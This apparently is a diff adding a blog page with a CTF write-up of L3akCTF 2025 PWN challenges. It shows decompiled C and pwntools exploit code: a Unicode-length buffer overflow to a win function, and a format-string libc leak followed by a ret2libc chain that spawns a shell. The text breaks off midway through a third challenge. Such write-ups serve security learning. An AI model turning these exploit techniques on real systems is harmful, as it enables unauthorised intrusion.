@@ -1,0 +1,983 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <style>
+        :root {
+            --accent-color: #FF4D4D;
+            --font-size: 17.5px;
+        }
+    </style>
+
+    
+    
+    
+    
+    
+    
+
+    
+    <title>L3akCTF 2025 | PWN</title>
+    <meta name="description" content="
+Overview This weekend, I played L3ak CTF. Since my team didn’t participate, I created an account to play individually, focusing on solving only the PWN …">
+    <meta name="keywords" content='pwn, writeup'>
+
+    <meta property="og:url" content="https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/">
+    <meta property="og:type" content="website">
+    <meta property="og:title" content="L3akCTF 2025 | PWN">
+    <meta property="og:description" content="
+Overview This weekend, I played L3ak CTF. Since my team didn’t participate, I created an account to play individually, focusing on solving only the PWN …">
+    <meta property="og:image" content="https://m4nj4r0.github.io/blog/images/avatar.png">
+    <meta property="og:image:secure_url" content="https://m4nj4r0.github.io/blog/images/avatar.png">
+
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="L3akCTF 2025 | PWN">
+    <meta name="twitter:description" content="
+Overview This weekend, I played L3ak CTF. Since my team didn’t participate, I created an account to play individually, focusing on solving only the PWN …">
+    <meta property="twitter:domain" content="https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/">
+    <meta property="twitter:url" content="https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/">
+    <meta name="twitter:image" content="https://m4nj4r0.github.io/blog/images/avatar.png">
+
+    
+    <link rel="canonical" href="https://m4nj4r0.github.io/blog/posts/l3akctf-2025--pwn/">
+
+    
+    <link rel="stylesheet" type="text/css" href="/blog/css/normalize.min.css" media="print">
+
+    
+    <link rel="stylesheet" type="text/css" href="/blog/css/main.min.css">
+
+    
+    <link id="dark-theme" rel="stylesheet" href="/blog/css/dark.min.css">
+
+    
+    <script src="/blog/js/bundle.min.70293498aa96b2dbb767ec11a622eb2266d8fc37a0fff88233a82952e3c72b15.js" integrity="sha256-cCk0mKqWstu3Z&#43;wRpiLrImbY/Deg//iCM6gpUuPHKxU="></script>
+
+    
+    
+</head>
+<body>
+        <script>
+            
+            setThemeByUserPref();
+        </script><header class="header">
+    <nav class="header-nav">
+
+        
+        <div class="avatar">
+            <a href="https://m4nj4r0.github.io/blog/">
+                <img src='/blog/images/avatar.png' alt="avatar">
+            </a>
+        </div>
+        
+
+        <div class="nav-title">
+            <a class="nav-brand" href="https://m4nj4r0.github.io/blog/">Manjaro</a>
+        </div>
+
+        <div class="nav-links">
+            
+            <div class="nav-link">
+                <a href="https://m4nj4r0.github.io/blog/posts/" aria-label="" > Posts </a>
+            </div>
+            
+            <div class="nav-link">
+                <a href="https://m4nj4r0.github.io/blog/tags/" aria-label="" > Tags </a>
+            </div>
+            
+
+            <span class="nav-icons-divider"></span>
+            <div class="nav-link dark-theme-toggle">
+                <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                <a aria-hidden="true" role="switch">
+                    <span class="theme-toggle-icon" data-feather="moon"></span>
+                </a>
+            </div>
+
+            <div class="nav-link" id="hamburger-menu-toggle">
+                <span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
+                <a aria-checked="false" aria-labelledby="hamburger-menu-toggle" id="hamburger-menu-toggle-target" role="switch">
+                    <span data-feather="menu"></span>
+                </a>
+            </div>
+
+            
+            <ul class="nav-hamburger-list visibility-hidden">
+                
+                <li class="nav-item">
+                    <a href="https://m4nj4r0.github.io/blog/posts/" > Posts </a>
+                </li>
+                
+                <li class="nav-item">
+                    <a href="https://m4nj4r0.github.io/blog/tags/" > Tags </a>
+                </li>
+                
+                <li class="nav-item dark-theme-toggle">
+                    <span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
+                    <a role="switch">
+                        <span class="theme-toggle-icon" data-feather="moon"></span>
+                    </a>
+                </li>
+            </ul>
+
+        </div>
+    </nav>
+</header>
+<main id="content">
+    <div class="post container">
+    <div class="post-header-section">
+        <h1>L3akCTF 2025 | PWN</h1>
+
+        
+
+        
+	
+	
+	
+	
+        
+
+	
+
+	
+
+	
+          <small role="doc-subtitle"></small>
+	
+
+	
+          <p class="post-date">
+              
+
+              July 13, 2025
+
+              
+          </p>
+	
+
+        <ul class="post-tags">
+          
+           
+             <li class="post-tag"><a href="https://m4nj4r0.github.io/blog/tags/pwn">pwn</a></li>
+           
+         
+           
+             <li class="post-tag"><a href="https://m4nj4r0.github.io/blog/tags/writeup">writeup</a></li>
+           
+         
+        </ul>
+    </div>
+
+    <div class="post-content">
+        <p><img src="/blog/images/l3ak25/l3ak.png" alt="stack"></p>
+<h2 id="overview">Overview</h2>
+<p>This weekend, I played L3ak CTF. Since my team didn’t participate, I created an account to play individually, focusing on solving only the PWN challenges. The difficulty of the challenges ranged from easy to hard, but on average, I would say they were of medium difficulty (considering only the PWN challenges). I managed to solve all of them during the CTF, and I have to say — they turned out to be more fun than I expected.</p>
+<h2 id="challenges">Challenges</h2>
+<h3 id="safe-gets">Safe Gets</h3>
+<p><strong>Safe Gets</strong> is probably the easiest PWN challenge.
+It’s a simple buffer overflow with a <code>win()</code> function.
+Although, there are two catches.</p>
+<p>The first one is that the string is reversed, which isn’t really a complication.
+We can just reverse our payload, or put a zero byte at the beginning so <code>strlen(s)</code> returns 0.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">259</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-110h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> tmp; <span style="color:#75715e">// [rsp+103h] [rbp-Dh]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">int</span> n; <span style="color:#75715e">// [rsp+104h] [rbp-Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> i; <span style="color:#75715e">// [rsp+108h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">gets</span>(s);
+</span></span><span style="display:flex;"><span>  n <span style="color:#f92672">=</span> <span style="color:#a6e22e">strlen</span>(s);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>; i <span style="color:#f92672">&lt;</span> n <span style="color:#f92672">/</span> <span style="color:#ae81ff">2</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    tmp <span style="color:#f92672">=</span> s[n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> i];
+</span></span><span style="display:flex;"><span>    s[n <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> i] <span style="color:#f92672">=</span> s[i];
+</span></span><span style="display:flex;"><span>    s[i] <span style="color:#f92672">=</span> tmp;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;Reversed string:&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">puts</span>(s);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>The second catch is that there is a Python wrapper for running the binary,
+and it accepts user input with <code>input()</code>.
+The max length of that input is <code>0xff</code>, which should make a buffer overflow impossible.</p>
+<p>But Python can accept Unicode characters as input, and they can contain multiple bytes.
+Sending them to <code>gets()</code> will result in an overflow if we send enough.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>BINARY <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./chall&#34;</span>
+</span></span><span style="display:flex;"><span>MAX_LEN <span style="color:#f92672">=</span> <span style="color:#ae81ff">0xff</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get input from user</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> input(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Enter your input (max </span><span style="color:#e6db74">{</span>MAX_LEN<span style="color:#e6db74">}</span><span style="color:#e6db74"> bytes): &#34;</span>)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(payload) <span style="color:#f92672">&gt;</span> MAX_LEN:
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[-] Input too long!&#34;</span>)
+</span></span><span style="display:flex;"><span>    sys<span style="color:#f92672">.</span>exit(<span style="color:#ae81ff">1</span>)
+</span></span></code></pre></div><p>Payload just fills the buffer until the return address,
+then sends a <code>ret</code> to align the stack,
+and after that, <code>win</code> to get a shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x40101a</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;ч&#34;</span><span style="color:#f92672">.</span>encode() <span style="color:#f92672">*</span> (<span style="color:#ae81ff">0x116</span> <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>),
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>,
+</span></span><span style="display:flex;"><span>    ret,
+</span></span><span style="display:flex;"><span>    exe<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>win
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sl(payload)
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/safe_gets.py">exploit.py</a></p>
+<h3 id="the-goose">The Goose</h3>
+<p>This is also an easy challenge, but a little bit harder than the previous one,
+because it doesn&rsquo;t have a <code>win</code> function, so <strong>ret2libc</strong> is needed.</p>
+<p>The binary is pretty simple. We enter a username, and after that, we guess a number.
+If we guess the number correctly, we enter a function with a format string vulnerability (for leaking)
+and a buffer overflow (for <strong>ret2libc</strong>).</p>
+<p>We can fill up the username with 64 characters, and when it’s printed in <code>guess()</code>,
+the secret number will be leaked.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span> username[<span style="color:#ae81ff">64</span>];
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> nhonks;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> timenow; <span style="color:#75715e">// eax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setvbuf</span>(_bss_start, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">2</span>, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  timenow <span style="color:#f92672">=</span> <span style="color:#a6e22e">time</span>(<span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">srand</span>(timenow);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setuser</span>(); <span style="color:#75715e">// __isoc99_scanf(&#34;%64s&#34;, username);
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  nhonks <span style="color:#f92672">=</span> <span style="color:#a6e22e">rand</span>() <span style="color:#f92672">%</span> <span style="color:#ae81ff">91</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#a6e22e">guess</span>() ) <span style="color:#75715e">// __isoc99_scanf(&#34;%d&#34;, &amp;guess_); ... return guess_ == nhonks;
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#a6e22e">highscore</span>();
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">puts</span>(<span style="color:#e6db74">&#34;tough luck. THE GOOSE WINS! GET THE HONK OUT!&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">void</span> <span style="color:#a6e22e">highscore</span>()
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">128</span>]; <span style="color:#75715e">// [rsp+0h] [rbp-170h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> s[<span style="color:#ae81ff">128</span>]; <span style="color:#75715e">// [rsp+80h] [rbp-F0h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  _BYTE v2[<span style="color:#ae81ff">32</span>]; <span style="color:#75715e">// [rsp+100h] [rbp-70h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> format[<span style="color:#ae81ff">80</span>]; <span style="color:#75715e">// [rsp+120h] [rbp-50h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">strcpy</span>(format, <span style="color:#e6db74">&#34;wow %s you&#39;re so good. what message would you like to leave to the world?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;what&#39;s your name again?&#34;</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">__isoc99_scanf</span>(<span style="color:#e6db74">&#34;%31s&#34;</span>, v2);
+</span></span><span style="display:flex;"><span>  s[<span style="color:#ae81ff">31</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">sprintf</span>(s, format, v2);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(s);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, buf, <span style="color:#ae81ff">0x400uLL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;got it. bye now.&#34;</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><p>After we get past the guessing, we have a format string vulnerability and a buffer overflow.
+First, use the format string to get a libc leak,
+and after that, do a simple ROP chain to call <code>system(&quot;/bin/sh&quot;)</code> to get a shell.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-py" data-lang="py"><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt; &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">64</span>)
+</span></span><span style="display:flex;"><span>guess <span style="color:#f92672">=</span> r(<span style="color:#ae81ff">1</span>)[<span style="color:#ae81ff">0</span>]
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;honks?&#34;</span>, i2b(guess))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>sla(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;again?&#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%21$p&#34;</span>)
+</span></span><span style="display:flex;"><span>ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;wow &#34;</span>)
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> int(ru(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34; &#34;</span>, <span style="color:#66d9ef">True</span>), <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x93975</span>
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>success(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Libc leak: </span><span style="color:#e6db74">{</span>libc_leak<span style="color:#e6db74">:</span><span style="color:#e6db74">#x</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75b</span>
+</span></span><span style="display:flex;"><span>ret     <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x10f75c</span>
+</span></span><span style="display:flex;"><span>binsh   <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\0</span><span style="color:#e6db74">&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat(
+</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x178</span>,
+</span></span><span style="display:flex;"><span>    pop_rdi,
+</span></span><span style="display:flex;"><span>    binsh,
+</span></span><span style="display:flex;"><span>    ret,
+</span></span><span style="display:flex;"><span>    libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system
+</span></span><span style="display:flex;"><span>)
+</span></span><span style="display:flex;"><span>sa(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;world?&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>ia()
+</span></span></code></pre></div><p>Full exploit can be found here: <a href="/blog/scripts/l3ak25/the_goose.py">exploit.py</a></p>
+<h3 id="chunky-threads">Chunky Threads</h3>
+<p>When I first saw this challenge, my initial thought was that it must be some kind of race condition,
+but actually it isn&rsquo;t (really).</p>
+<p>The binary works like this: we can send commands in a large buffer.
+The <code>CHUNK</code> command creates a new thread and prints, in a loop with a sleep, the given content.
+The <code>CHUNKS</code> command just sets the maximal number of threads.</p>
+<p>In <code>print</code>, we have an overflow because the command buffer is bigger than the message buffer.
+Also, it does a <code>memcpy</code> without zeroing out the last byte,
+so we can leak some things from the stack if we don&rsquo;t send a zero byte at the end.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>argv, <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">**</span>envp)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">int</span> i; <span style="color:#75715e">// [rsp+14h] [rbp-41Ch]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">ssize_t</span> size; <span style="color:#75715e">// [rsp+18h] [rbp-418h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> command[<span style="color:#ae81ff">1032</span>]; <span style="color:#75715e">// [rsp+20h] [rbp-410h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> canary; <span style="color:#75715e">// [rsp+428h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdout, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">setbuf</span>(stdin, <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">memset</span>(command, <span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">0x400uLL</span>);
+</span></span><span style="display:flex;"><span>  curthread <span style="color:#f92672">=</span> threads;
+</span></span><span style="display:flex;"><span>  <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;%s&#34;</span>, title);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">while</span> ( <span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    size <span style="color:#f92672">=</span> <span style="color:#a6e22e">read</span>(<span style="color:#ae81ff">0</span>, command, <span style="color:#ae81ff">1023uLL</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( size <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">break</span>;
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">parsecmd</span>(command, size);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">for</span> ( i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">9</span>; <span style="color:#f92672">++</span>i )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( threads[i] )
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_join</span>(threads[i], <span style="color:#ae81ff">0LL</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">__int64</span> <span style="color:#66d9ef">__fastcall</span> <span style="color:#a6e22e">parsecmd</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>command, <span style="color:#66d9ef">__int64</span> size)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">pthread_t</span> <span style="color:#f92672">*</span><span style="color:#66d9ef">thread</span>; <span style="color:#75715e">// rax
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>endptr[<span style="color:#ae81ff">2</span>]; <span style="color:#75715e">// [rsp+18h] [rbp-18h] BYREF
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">__int64</span> canary; <span style="color:#75715e">// [rsp+28h] [rbp-8h]
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>  canary <span style="color:#f92672">=</span> <span style="color:#a6e22e">__readfsqword</span>(<span style="color:#ae81ff">0x28u</span>);
+</span></span><span style="display:flex;"><span>  endptr[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  endptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">*</span>(_OWORD <span style="color:#f92672">*</span>)<span style="color:#f92672">&amp;</span>pa.sleep <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  pa.size <span style="color:#f92672">=</span> <span style="color:#ae81ff">0LL</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(command, <span style="color:#e6db74">&#34;CHUNKS &#34;</span>, <span style="color:#ae81ff">7uLL</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    nthread <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(command <span style="color:#f92672">+</span> <span style="color:#ae81ff">7</span>, <span style="color:#ae81ff">0LL</span>, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( nthread <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0xAu</span> )
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">errx</span>(<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>, <span style="color:#e6db74">&#34;bad number of threads&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;set nthread to %u</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, nthread);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">else</span> <span style="color:#66d9ef">if</span> ( <span style="color:#f92672">!</span><span style="color:#a6e22e">strncmp</span>(command, <span style="color:#e6db74">&#34;CHUNK &#34;</span>, <span style="color:#ae81ff">5uLL</span>) )
+</span></span><span style="display:flex;"><span>  {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> ( nthread )
+</span></span><span style="display:flex;"><span>    {
+</span></span><span style="display:flex;"><span>      pa.sleep <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(command <span style="color:#f92672">+</span> <span style="color:#ae81ff">6</span>, endptr, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>      pa.count <span style="color:#f92672">=</span> <span style="color:#a6e22e">strtoul</span>(endptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>, endptr, <span style="color:#ae81ff">10</span>);
+</span></span><span style="display:flex;"><span>      pa.src <span style="color:#f92672">=</span> endptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      pa.size <span style="color:#f92672">=</span> size <span style="color:#f92672">-</span> (endptr[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">-</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)command);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">thread</span> <span style="color:#f92672">=</span> curthread<span style="color:#f92672">++</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#a6e22e">pthread_create</span>(<span style="color:#66d9ef">thread</span>, <span style="color:#ae81ff">0LL</span>, (<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>(<span style="color:#f92672">*</span>)(<span style="color:#66d9ef">void</span> <span style="color:#f92672">*</span>))print, <span style="color:#f92672">&amp;</span>pa);
+</span></span><span style="display:flex;"><span>      <span style="color:#f92672">--</span>nthread;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>
+</span></span><span style="display:flex;"><span>    {
